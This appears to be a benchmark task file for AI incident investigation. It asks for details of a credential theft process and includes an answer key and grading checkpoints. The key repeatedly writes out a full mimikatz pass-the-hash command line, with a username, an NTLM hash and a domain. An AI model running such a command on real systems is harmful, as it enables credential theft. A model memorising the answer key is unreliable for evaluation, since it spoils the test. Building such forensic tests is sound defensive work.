tasks:
- task_id: incident_39_latest_cleaned_test_set_task_64
  title: incident_39_latest_cleaned_test_set_task_64
  description: 'A related alert flagged the execution of a known credential theft tool that spawned that PowerShell script. What was the process ID, creation time, and full command line of that credential theft tool process?'
  inherit_shared: true
  initial_context:
    incident_context: 'During this incident, an attempt to disable the Microsoft Defender Antivirus service was detected, likely an attempt to evade detection. Related activity on the same endpoint included a PowerShell process (PID 6636, created 2024-06-27T14:32:46.586Z) running the command `powershell.exe c:\m365dattack\get-krbticket.ps1`.'
    question: 'A related alert flagged the execution of a known credential theft tool that spawned that PowerShell script. What was the process ID, creation time, and full command line of that credential theft tool process?'
    # Main task submission evaluation - uses LLM-as-a-judge by default
    # To use static matching instead, change strategy to "static" and set:
    #   criteria:
    #     expected_answers:
    #       - 'Process ID: 7092, Created Time (UTC): 2024-06-27T14:32:46.4998999Z, Command line: `"mimikatz.exe" privilege::debug "sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\"powershell.exe c:\m365dattack\get-krbticket.ps1\"" exit -wait`'
  scoring:
    llm_judge:
      model: "{judge_llm}"
      steps_per_message: 50
      judge_system_template: judge/checkpoint_judge_system.md
      judge_user_template: judge/checkpoint_judge_user.md
      submission:
        target: submission
        judge_system_template: judge/submission_judge_system.md
        judge_user_template: judge/submission_judge_user.md
        description: 'Process ID: 7092, Created Time (UTC): 2024-06-27T14:32:46.4998999Z, Command line: `"mimikatz.exe" privilege::debug "sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\"powershell.exe c:\m365dattack\get-krbticket.ps1\"" exit -wait`'
        max_score: 1.0
      checkpoint_1:
        target: trajectory
        max_score: 0.5
        weight: 1.0
        title: Checkpoint 1
        description: 'An attempt to tamper with Microsoft Defender Antivirus was detected in association with the file `get-krbticket.ps1`, indicating the attacker tried to disable antivirus protection to evade detection.'
      checkpoint_2:
        target: trajectory
        max_score: 0.5
        weight: 1.0
        title: Checkpoint 2
        description: 'The same script was referenced by a known credential theft tool: the attacker executed the process with Process ID `7092` at `2024-06-27t14:32:46.4998999z` using the command line `"mimikatz.exe" privilege::debug "sekurlsa::pth /user:fk8mq /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:vnevado.alpineskihouse.co /run:\"powershell.exe c:\m365dattack\get-krbticket.ps1\"" exit -wait`, performing a pass-the-hash attack to steal credentials and request Kerberos tickets.'
  scoring_aggregation:
    max:
      scores:
      - submission
      - - checkpoint_1
        - checkpoint_2
